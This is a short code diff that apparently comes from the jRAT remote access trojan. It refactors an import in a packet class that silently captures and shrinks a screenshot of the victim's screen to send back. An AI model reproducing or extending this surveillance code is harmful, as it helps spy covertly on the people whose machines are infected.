@@ -8,13 +8,13 @@ import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
 import se.jrat.common.utils.ImageUtils;
-import se.jrat.stub.utils.ScreenUtils;
+import se.jrat.common.utils.Utils;
 
 public class Packet33Thumbnail extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		if (ScreenUtils.isHeadless()) {
+		if (Utils.isHeadless()) {
 			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 			BufferedImage screenShot = new Robot().createScreenCapture(screenRect);
 			screenShot = ImageUtils.resize(screenShot, 150, 100);
